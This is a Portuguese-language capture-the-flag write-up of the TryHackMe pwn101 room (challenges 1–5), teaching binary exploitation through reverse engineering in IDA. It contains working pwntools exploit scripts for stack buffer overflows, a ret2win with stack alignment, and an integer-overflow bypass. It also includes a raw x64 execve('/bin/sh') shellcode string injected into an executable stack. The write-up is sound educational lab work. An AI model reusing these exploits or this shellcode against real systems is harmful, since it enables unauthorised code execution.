---
title: "Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM"
date: 2024-08-11
description: Nesse relatório tento usar a sala [pwn101](https://tryhackme.com/r/room/pwn101) para estimular o aprendizado de Engenharia Reversa e Exploração de Binários a partir de programas vulneráveis.
published: 2024-08-11 
categories:
  - easy
tags:
  - Pwn
  - Engenharia Reversa
author: 0xCr0w
---

# [pwn101 5/10] writeUp  

## [pwn101 - Challenge 1]

A sala nos diz que a aplicação está rodando no endereço '10.10.151.216:9001'. Com o utilitário nc podemos escrever e ler em conexões TCP e UDP. Assim, podemos nos conectar com a aplicação usando o comando:

nc 10.10.151.216 9001

Ao conectarmos com a aplicação recebemos um texto com um pedido de ajuda para fornecer os ingredientes para o programa como input. A sala fornece uma dica de inicio 'AAAAAAAAAAA'. É de se imaginar que o programa possua algum tipo de buffer overflow. É fácil de receber um shell quando tentamos quebrar a aplicação fornecendo uma string com um tamanho grande.

![alt text](/images/crow-post-pwn/desafio1Imagem1.png)

Porém, vamos tentar entender direito o que está acontecendo. Talvez não tenhamos tanta sorte da próxima vez.

![alt text](/images/crow-post-pwn/desafio1Imagem2.png)

No início da função principal temos uma instrução que move o valor *0x539* para o endereço **var_4**. Mais embaixo, temos a chamada para a função _gets sem nenhuma restrição de tamanho de input. Esse input é armazenado em **var_40**. Com isso, é possível sobrescrever a variável **var_4**. No fim, existe uma comparação entre o valor de inicio em **var_4** com o valor atual e um salto associado à condição **not zero** é realizada na instrução abaixo. Ou seja, o salto é realizado se o resultado da comparação anterior não for igual. Portanto, basta modificar o valor da variável na pilha que obtemos o shell. Para isso, foi necessário abusar da função _gets e explorar o stack overflow para garantir que a instrução jnz nos coloque no procedimento que nos dá o shell.

## [pwn102 - Challenge 2]


No segundo desafio, nos deparamos com um programa que printa na tela **I need badf00d to fee1dead
Am I right?** e que pede input ao usuário. De cara, tentamos quebrar o programa. Porém, nada de muito interessante acontece. 

![alt text](/images/crow-post-pwn/desafio2Imagem1.png)

Partimos, então, para engenharia reversa do binário. Na imagem abaixo, podemos ver as variáveis locais e as instruções que são do nosso interesse. A função possui três variáveis locais. As variáveis 4 e 8 estão localizadas em rbp - 4 e -8, respectivamente. Outra variável é declarada. Essa está localizada na posição rbp - 0x70. Existe uma chamada para a scanf que carrega o input do usuário na variável 70. Logo depois, é possível ver na imagem que os valores 0C0FF33h e 0C0D3h são comparados aos valores nas variaveis 4 e 8. Ou seja, o programa checka se os valores nessas variaveis são esses. A cada instrução de comparação, existe uma instrução de salto condicional que pula para um procedimento de saída se não for igual a zero. A seguir, temos uma chamada de sistema com um comando de shell a ser executado. Nosso objetivo então é chegar nessa chamada de sistema. Porém, só conseguiremos se os valores de var4 e var8 forem 0C0FF33h e 0C0D3h, respectivamente. Como não existe nenhuma restrição de tamanho na chamada da scanf, podemos usar essa entrada de dados para sobrescrever var4 e var8. Sabemos a posição de cada uma relativa ao endereço de var70. A variável 8 está à (0x70 - 0x8) de distância da variável 70. E a variável 4 está logo abaixo da 8. Portanto, devemos ter: 

-   **Preenchimento completo da variável 70 na pilha:**

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 

A * (*0x70 - 0x8)*

-   **Preenchimento das variáveis 8 e 4 na pilha com os valores desejados:**

\xd3\xc0\x00\x00\x33\xff\xc0\x00 (Little Endian)


![alt text](/images/crow-post-pwn/desafio2Imagem2.png)

Aqui precisamos começar a utilizar uma ferramenta chamada pwntools - *depois de tentar redirecionar a saída do echo e falhar repetidas vezes.* Trata-se de uma ferreamenta que nos fornece uma interface para interagir de forma fácil tanto com processos do seu host quanto aplicações em servidores na internet. A partir do script abaixo, é possível ver algumas das funcionalidades que começaremos a usar. As linhas do código possuem comentários para esclarecer seu papel.

```python
import pwn

#fornecendo um parâmetro que nos permite verificar o dado bruto que está sendo enviado e recebido
pwn.context.log_level = 'debug' 

#estabelecendo o enderenço de domunicação remoto. Substitua ip pelo ip do servidor
p = pwn.remote("ip", 9002)  


#bytes enviados que farao a exploração
payload = b'A' * (0x70-0x8) + pwn.p32(0xc0d3) + pwn.p32(0xc0ff33)

#metodo que recebe dados puros
p.recv()

#metodo que envia o dado especificado pelo parametro
p.sendline(payload)
p.recv()
#nos da uma interface para emular um terminal
p.interactive()
```
## [pwn103 - Challenge 3]

Ao iniciarmos o programa, nos deparamos com uma interface com uma lista de escolhas. Vasculhando as funcionalidades na tentativa de quebrar o programa, encontramos um input em "General" que pode ser explorado. Tentar quebrar o programa nos retorna Segmentation Fault (uma tentativa de acessar um endereço virtual inválido). Começaremos a investigar a partir daqui. 


![alt text](/images/crow-post-pwn/desafio3Imagem1.png)

![alt text](/images/crow-post-pwn/desafio3Imagem2.png)

Vamos abrir o nosso querido IDA e partir para a análise do binário. Vale notar na parte esquerda da interface do IDA: podemos ver as funções que o programa faz uso. Podemos reconhecer "General", "bot_cmd", "announcements", "discussion" e "rules". Além disso, temos uma função chamada "admins_only" que parece um tanto quanto suspeita.

![alt text](/images/crow-post-pwn/desafio3Imagem3.png)

Vamos partir então para a função principal do programa e tentar entender a sua lógica. Nada muito interessante aqui. Temos basicamente uma jump table que associa cada input 1-5 a um endereço. Vamos então verificar a função "General" que, ao que tudo indica, nos forneceu um segmentation fault. 
![alt text](/images/crow-post-pwn/desafio3Imagem4.png)

Temos no início a declaração de uma variável com tamanho de 20 bytes. Reconhecemos a função scanf. Antes de sua chamada, é possível perceber que carregamos o endereço da variável s1 em rsi. Logo abaixo, existe a comparação do nosso input com a string "yes" com um salto para loc_401366 caso não sejam iguais. Nesse caso, pensei em análisar de forma dinâmica o que acontece quando eu "quebro" o programa. Vamos ver o que acontece durante o Segmentation Fault.

![alt text](/images/crow-post-pwn/desafio3Imagem5.png)

Quando quebramos o programa, recebemos o seguinte aviso do IDA: 

![alt text](/images/crow-post-pwn/desafio3Imagem6.png)

Ele reclama que no endereço 0x401377 tentamos acessar um endereço inválido. Mas, qual endereço? Vamos colocar um breakpoint no endereço da reclamação e visualizar a stack do processo. 

![alt text](/images/crow-post-pwn/desafio3Imagem7.png)

![alt text](/images/crow-post-pwn/desafio3Imagem8.png)

Claro. Aparentemente, estamos retornando para uma sequência de 41 que é a codificação ascii de 'A' em hexadecimal. Hipotése: 
```
Se pudermos controlar esse endereço, podemos controlar o fluxo do programa.
```
Vamos tentar realizar uma prova de conceito manipulando diretamente a memória do processo a fim de manipular o endereço de retorno e ver o que acontece. 

![alt text](/images/crow-post-pwn/desafio3Imagem9.png)

Tentaremos colocar o endereço de admins_only

![alt text](/images/crow-post-pwn/desafio3Imagem10.png)

![alt text](/images/crow-post-pwn/desafio3Imagem11.png)

![alt text](/images/crow-post-pwn/desafio3Imagem12.png)

![alt text](/images/crow-post-pwn/desafio3Imagem13.png)

Conseguimos. Ou seja, basta colocarmos o endereço entre os A's enviados para redirecionar o programa para admins_only. Vamos ver como o programa se comporta adiante. Para isso, usarei a técnica de breakpoints em todas as instruções e olhos atentos. 

![alt text](/images/crow-post-pwn/desafio3Imagem14.png)

Talvez estejamos sobreescrevendo algo importante. 

![alt text](/images/crow-post-pwn/desafio3Imagem15.png)

Vemos que para chegar no endereço de retorno temos que preencher 40 A's. Façamos somente isso com a modificação do endereço e vamos ver o que acontece.

![alt text](/images/crow-post-pwn/desafio3Imagem16.png)

O programa continua normalmente até que tenhamos outra segmentation fault na chamada de _system, nos redirecionando para uma instrução movaps dentro da função do_system.  

![alt text](/images/crow-post-pwn/desafio3Imagem17.png)

Procurando a definição da instrução na [internet](https://tizee.github.io/x86_ref_book_web/instruction/movaps.html#move-aligned-packed-single-precision-floating-point-values), vemos que precisamos garantir o alinhamento de 16 bytes dos operandos já que temos uma operação de memória.  
![alt text](/images/crow-post-pwn/desafio3Imagem18.png)

Olhando para o valor do rsp, percebemos que não é o caso.

![alt text](/images/crow-post-pwn/desafio3Imagem19.png)

Para contornar a situação, vamos manipular o tamanho da stack a fim de que tenhamos o alinhamento desejado. Uma técnica comum é a de usar um retorno intermediário. A ideia é saltar para uma instrução de retorno que saltará para a nossa função desejada. Nesse caso, vamos saltar de forma intermediária para o endereço 0x40158B. Depois que saltarmos, retn irá pegar o valor no topo da stack e saltar para esse endereço. Portanto, aí que colocaremos o nosso endereço da função admins_only. 
![alt text](/images/crow-post-pwn/desafio3Imagem20.png)


Nosso shellcode deve ter a seguinte cara: 

```python
payload = b'A' * 40 + pwn.p64(0x40158B) + pwn.p64(0x401554)
```


Nosso script ficará assim:


```python
import pwn
import time

pwn.context.log_level = 'debug'

payload = b'A' * 40 + pwn.p64(0x40158B) + pwn.p64(0x401554)

p = pwn.remote("ip", 9003)

p.recv()
time.sleep(1)
p.sendline(b'3')
time.sleep(1)
p.recv()

p.sendline(payload)

p.interactive()
```

![alt text](/images/crow-post-pwn/desafio3Imagem21.png)


![alt text](/images/crow-post-pwn/desafio3Imagem22.png)

## [pwn104 - Challenge 4]

No quarto desafio, nosso programa nos printa na tela uma mensagem com um endereço e aguarda um input. Como já é hábito, tentamos quebrar o programa. A nossa entrada gera um Segmentation Fault. Vamos partir para a análise dinâmica com o IDA. 

![alt text](/images/crow-post-pwn/desafio4Imagem1.png)

A estrutura do nosso programa é simples. Temos uma função principal com uma variável buf de tamanho 0x50. As coisas ficam interessantes nas chamadas para printf e read. 

![alt text](/images/crow-post-pwn/desafio4Imagem2.png)

A primeira carrega o endereço de buf e carrega a seguinte string para printar:

```
"I'm waiting for you at %p\n"
```
Vamos comparar o endereço carregado em rsi na instrução **mov rsi, rax** com o que aparece no terminal. 

![alt text](/images/crow-post-pwn/desafio4Imagem3.png)

![alt text](/images/crow-post-pwn/desafio4Imagem4.png)

![alt text](/images/crow-post-pwn/desafio4Imagem5.png)

De fato, o endereço que aparece no terminal é o endereço do próprio buffer que está na função main. Posteriormente, a função read é chamada com o endereço de escrita no endereço de buf e com o tamanho de 200 bytes. É de esperar o Segmentation Fault. Estamos escrevendo até 200 bytes no endereço de buf. Mas, como exploramos essa vulnerabilidade? Dessa vez não existe nenhuma função de retorno interessante no binário. Lembre-se que não existe diferença fundamental entre dados e instruções. Bytes passam a cumprir papel de dados ou instruções a depender do contexto. A linguagem assembly nada mais é que uma codificação que permite que humanos interpretem mais facilmente a linguagem de máquina. Ainda, a linguagem de máquina nada mais é que uma codificação de bytes que permite que máquinas sejam capazes de interpretar bytes. Todo processador precisa "saber" aonde buscar os bytes a serem interpretados como instruções. Essa responsabilidade na arquitetura dos processadores x86-64 fica para o **RIP**, que é um registrador que armazena o endereço da próxima instrução. Se conseguirmos controlar o **RIP**, conseguimos escolher o que o processador vai tentar ler para interpretar como instruções. Mas, primeiro, vamos usar uma ferramenta que nos mostra as medidas de segurança que existem no binário. 

![alt text](/images/crow-post-pwn/desafio4Imagem6.png)

A ferramenta nos diz que a execução em pilha é permitida. Isso significa que podemos carregar bytes que correspondem a instruções na pilha e mandar o RIP apontar para lá. A forma que nós estamos acostumados a fazer é de garantir que o topo da pilha contenha nosso endereço desejado no momento em que o **RIP** aponta para a instrução retn. 

O procedimento então fica da seguinte forma: 
```
preencher o buf com instruções + padding + endereço de retn  
```


Colocando alguns A's e verificando o valor do rsp quando a instrução retn é executada, descobrimos até onde precisamos preencher. O fluxo retorna para libc_start_call_main.  
![alt text](/images/crow-post-pwn/desafio4Imagem7.png)

Se contarmos quantas células temos, veremos que temos 12 * 8 bytes para serem preenchidos. Começamos em 0x00007FFFFFFFDC80 e terminamos em 0x00007FFFFFFFDCD8. Nosso payload deve ser da forma:
```python
payload =  shellcode + b'A' * (88-len(shellcode)) + endereço
```

O que queremos executar exatamente? Bom. Podemos executar instruções arbitrárias - contanto que caibam no buf. Porque não poppar um shell? Procurando na internet encontramos um shellcode x64 linux que realiza um execve com "bin/sh". E como resolvemos o endereço? Bom. Nós recebemos o endereço na tela, basta capturamos com o pwntools. 

```python
import pwn
import time


#pwn.context.binary = binary = './pwn104-1644300377109.pwn104'
pwn.context.log_level = 'debug'

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'


payload =  shellcode + b'A' * (88-len(shellcode))

#p = pwn.process(binary)
p = pwn.remote("10.10.225.226", 9004)



p.recvuntil(b"I'm waiting for you at ")
address = p.recvline()

time.sleep(1)

bufferAddress = pwn.p64(int(address, 16))

payload = payload + bufferAddress

p.sendline(payload)

p.interactive()
```

É importante notar a linha de conversão do endereço já que não recebemos os bytes puros no terminal. Recebemos a representação em ascii, como é possível ver a partir do offset 0x84 no pacote abaixo. 

![alt text](/images/crow-post-pwn/desafio4Imagem8.png)

![alt text](/images/crow-post-pwn/desafio4Imagem9.png)

## [pwn105 - Challenge 5]

Ao executarmos o programa, nos deparamos com uma interface para a inserção de dois números. Temos um input para cada número. O programa printa na tela o resultado da soma dos dois. Tentando quebrar o programa de alguma forma não encontramos nada de interessante. Partimos logo, então, para a análise do binário no IDA. 

![alt text](/images/crow-post-pwn/desafio5Imagem1.png)


O breakpoints marcam instruções do nosso interesse. Temos no início, dois scanf sem controle de tamanho de input. Percebemos também que os valores do primeiro e segundo input são carregados nas variáveis var14 e var10, respectivamente.

![alt text](/images/crow-post-pwn/desafio5Imagem2.png)

Esses valores são carregados nos registrados eax e edx. Em seguida, temos duas instruções do tipo 
```asm
add eax, edx
mov [rbp+var_C], eax
```
que adiciona os valores carregados no registrador eax e armazena na variável C. 

Nosso objetivo está nos offset 0x130E e 0x1312. 

```s
cmp [rbp+var_C], 0
js short loc_134B
```
A primeira instrução verifica se o valor em var_C é negativo. A segunda pula para o endereço do procedimento do shell caso var_C seja negativa. O que precisamos então, é garantir que a variável C seja negativa. Se tentarmos simplesmente colocar valores negativos nos input teremos problemas com as seguintes instruções:

```s
mov     eax, [rbp+var_14]
test    eax, eax
js      short loc_1384
mov     eax, [rbp+var_10]
test    eax, eax
js      short loc_1384
```

Essas instruções verificam se uma das variáveis inseridas são negativas. Se forem, o programa salta para o procedimento loc_1384, que finaliza o programa. 

![alt text](/images/crow-post-pwn/desafio5Imagem3.png)


Mas então, como fazer isso? Sabemos que nossas variáveis tem tamanho de 4 bytes.

![alt text](/images/crow-post-pwn/desafio5Imagem4.png)

Além disso, lembre-se que nossos inteiros tem o valor máximo de 2147483647 e da forma de representação dos números com sinal em assembly. Pensando com a codificação two's complement, podemos abusar do overflow de inteiros (já que nesse caso não temos nenhuma checkagem). Com isso: 

![alt text](/images/crow-post-pwn/desafio5Imagem5.png)
